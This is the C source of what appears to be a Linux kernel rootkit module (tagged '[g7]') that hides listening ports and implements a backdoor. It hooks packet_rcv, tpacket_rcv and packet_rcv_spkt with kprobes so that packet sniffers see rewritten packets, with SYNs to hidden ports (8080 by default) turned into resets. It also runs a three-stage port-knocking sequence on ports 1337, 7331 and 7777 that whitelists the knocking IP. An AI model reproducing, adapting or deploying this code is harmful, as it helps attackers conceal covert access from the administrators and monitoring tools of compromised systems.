#include <linux/kernel.h>
#include <linux/kprobes.h>
#include <linux/skbuff.h>
#include <linux/netdevice.h>
#include <linux/inet.h>
#include <uapi/linux/if_packet.h>
#include <uapi/linux/ip.h>
#include <uapi/linux/ipv6.h>
#include <linux/ip.h>
#include <linux/in.h>
#include <linux/ipv6.h>

#include "common.h"
#include "hook.h"
#include "porthide.h"


// stage 1: 1337
knock_list_t ips_stage1 = {
    .ip  = { 0 },
    .version = -1,
    .prev = NULL,
    .next = NULL,
};

knock_list_t_ptr ips_stage1_tail = &ips_stage1;

// stage 2: 7331
knock_list_t ips_stage2 = {
    .ip  = { 0 },
    .version = -1,
    .prev = NULL,
    .next = NULL,
};

knock_list_t_ptr ips_stage2_tail = &ips_stage2;

// stage 3: 7777
knock_list_t ips_stage3 = {
    .ip  = { 0 },
    .version = -1,
    .prev = NULL,
    .next = NULL,
};

knock_list_t_ptr ips_stage3_tail = &ips_stage3;

lport_list_t hidden_lports = {
    .lport = -1,
    .prev = NULL,
    .next = NULL,
};

lport_list_t_ptr hidden_lports_tail = &hidden_lports;

static int g7_packet_rcv(struct kprobe *, struct pt_regs *);
static int g7_fault(struct kprobe *, struct pt_regs *, int);
static void g7_post(struct kprobe *, struct pt_regs *m, unsigned long);

// TODO store in array of kprobes
static struct kprobe p_rcv = {
    .symbol_name = "packet_rcv",
};

static struct kprobe tp_rcv = {
    .symbol_name = "tpacket_rcv",
};

static struct kprobe p_rcv_spkt = {
    .symbol_name = "packet_rcv_spkt",
};

void
hide_lports(void)
{
    p_rcv.pre_handler = g7_packet_rcv;
    p_rcv.post_handler = g7_post;
    p_rcv.fault_handler = g7_fault;

    tp_rcv.pre_handler = g7_packet_rcv;
    tp_rcv.post_handler = g7_post;
    tp_rcv.fault_handler = g7_fault;

    p_rcv_spkt.pre_handler = g7_packet_rcv;
    p_rcv_spkt.post_handler = g7_post;
    p_rcv_spkt.fault_handler = g7_fault;

    if (register_kprobe(&p_rcv))
        DEBUG_INFO("[g7] Could not insert kprobe p_rcv\n");

    if (register_kprobe(&tp_rcv))
        DEBUG_INFO("[g7] Could not insert kprobe tp_rcv\n");

    if (register_kprobe(&p_rcv_spkt))
        DEBUG_INFO("[g7] Could not insert kprobe p_rcv_spkt\n");

    hide_lport(8080);
}

void
unhide_lports(void)
{
    unregister_kprobe(&p_rcv);
    unregister_kprobe(&tp_rcv);
    unregister_kprobe(&p_rcv_spkt);
}

void
hide_lport(lport_t lport)
{
    if (!list_contains_lport(&hidden_lports, lport))
        add_lport_to_list(hidden_lports_tail, lport);
}

void
unhide_lport(lport_t lport)
{
    remove_lport_from_list(hidden_lports_tail, lport);
}

static int
g7_packet_rcv(struct kprobe *kp, struct pt_regs *pt_regs)
{
    struct sk_buff *skb;
    skb = (struct sk_buff *)pt_regs->di;

    u8 protocol = 0;
    u8 ip[16] = { 0 };
    ip_version version;

    char *data = skb_network_header(skb);
    char ver = data[0];

    ver &= 0xf0;

    struct sk_buff *clone = skb_clone(skb, GFP_KERNEL);
    pt_regs->di = (long unsigned int)clone;

    if ((ver == 0x60)) {
        struct ipv6hdr *iphdr;

        iphdr = ipv6_hdr(clone);
        protocol = iphdr->nexthdr;
        version = v6;
        memcpy(ip, (u8 *)&iphdr->daddr, 16);

    } else if ((ver == 0x40)) {
        struct iphdr *iphdr;

        iphdr = ip_hdr(clone);
        protocol = iphdr->protocol;
        version = v4;
        memcpy(ip, (u8 *)&iphdr->daddr, 4);

    } else
        return 0;

    // We need to intercept (RST) the TCP handshake
    if (protocol == IPPROTO_TCP) {
        struct tcphdr *tcphdr;

        tcphdr = (struct tcphdr *)skb_transport_header(skb);
        unsigned src_port = (unsigned)ntohs(tcphdr->source);

        if (list_contains_knock(&ips_stage3, ip, version))
            return 0;

        if (tcphdr->syn || !tcphdr->ack)
            goto check_port;

        if (list_contains_knock(&ips_stage2, ip, version)) {
            if (src_port == 7777) {
                DEBUG_NOTICE("[g7] knocked port %d, port knocking sequence completed\n", src_port);
                add_knock_to_list(&ips_stage3_tail, ip, version);
	    }

            remove_knock_from_list(&ips_stage2, &ips_stage2_tail, ip, version);
        } else if (list_contains_knock(&ips_stage1, ip, version)) {
            if (src_port == 7331) {
                add_knock_to_list(&ips_stage2_tail, ip, version);
                DEBUG_NOTICE("[g7] knocked port %d, entering knocking stage 2\n", src_port);
	    }

            remove_knock_from_list(&ips_stage1, &ips_stage1_tail, ip, version);
        } else {
            if (src_port == 1337) {
                DEBUG_NOTICE("[g7] knocked port %d, entering knocking stage 1\n", src_port);
                add_knock_to_list(&ips_stage1_tail, ip, version);
	    }
        }

check_port:
        if (list_contains_lport(&hidden_lports, src_port))
            if (tcphdr->syn) {
                tcphdr->syn = 0;
                tcphdr->ack = 0;
                tcphdr->rst = 1;
            }
    }

    return 0;
}

static void
g7_post(struct kprobe *kp, struct pt_regs *pt_regs, unsigned long flags)
{
    return;
}

static int
g7_fault(struct kprobe *kp, struct pt_regs *pt_regs, int trapnr)
{
    return 0;
}

void
clear_hidden_lports(void)
{
    lport_list_t_ptr i = hidden_lports_tail;
    while ((i = remove_lport_from_list(i, i->lport)));
}

bool
list_contains_lport(lport_list_t_ptr list, lport_t lport)
{
    return !!find_lport_in_list(list, lport);
}

lport_list_t_ptr
find_lport_in_list(lport_list_t_ptr head, lport_t lport)
{
    lport_list_t_ptr i;
    for (i = head; i; i = i->next)
        if (i->lport == lport)
            return i;

    return NULL;
}

lport_list_t_ptr
add_lport_to_list(lport_list_t_ptr tail, lport_t lport)
{
    lport_list_t_ptr node;
    node = (lport_list_t_ptr)kmalloc(sizeof(lport_list_t), GFP_KERNEL);

    if (node) {
        node->lport = lport;
        node->next = NULL;
        node->prev = tail;
        tail->next = node;
        hidden_lports_tail = node;
        return node;
    }

    return NULL;
}

lport_list_t_ptr
remove_lport_from_list(lport_list_t_ptr list, lport_t lport)
{
    lport_list_t_ptr i = find_lport_in_list(list, lport), ret = NULL;

    if (i && (i->lport != -1)) {
        if (i->next)
            i->next->prev = i->prev;
        else
            hidden_lports_tail = i->prev ? i->prev : &hidden_lports;

        if (i->prev) {
            i->prev->next = i->next;
            ret = i->prev;
        }

        kfree(i);
    }

    return ret;
}

bool
list_contains_knock(knock_list_t_ptr list, ip_t ip, ip_version version)
{
    return !!find_knock_in_list(list, ip, version);
}

knock_list_t_ptr
find_knock_in_list(knock_list_t_ptr head, ip_t ip, ip_version version)
{
    knock_list_t_ptr i;
    for (i = head; i; i = i->next)
        if (!memcmp(i->ip, ip, (version == v4 ? 4 : 16)) && (version == -1 || i->version == version))
            return i;

    return NULL;
}

knock_list_t_ptr
add_knock_to_list(knock_list_t_ptr *tail, ip_t ip, ip_version version)
{
    knock_list_t_ptr node;
    node = (knock_list_t_ptr)kmalloc(sizeof(knock_list_t), GFP_KERNEL);

    if (node) {
        memcpy(node->ip, ip, (version == v4 ? 4 : 16));
        node->version = version;
        node->next = NULL;
        node->prev = *tail;
        (*tail)->next = node;
        *tail = node;
        return node;
    }

    return NULL;
}

knock_list_t_ptr
remove_knock_from_list(knock_list_t_ptr list, knock_list_t_ptr *tail, ip_t ip, ip_version version)
{
    knock_list_t_ptr i = find_knock_in_list(list, ip, version), ret = NULL;

    if (i && (!memcmp(i->ip, ip, (version == v4 ? 4 : 16)) && i->version != -1)) {
        if (i->next)
            i->next->prev = i->prev;
        else
            *tail = i->prev ? i->prev : list;

        if (i->prev) {
            i->prev->next = i->next;
            ret = i->prev;
        }

        kfree(i);
    }

    return ret;
}
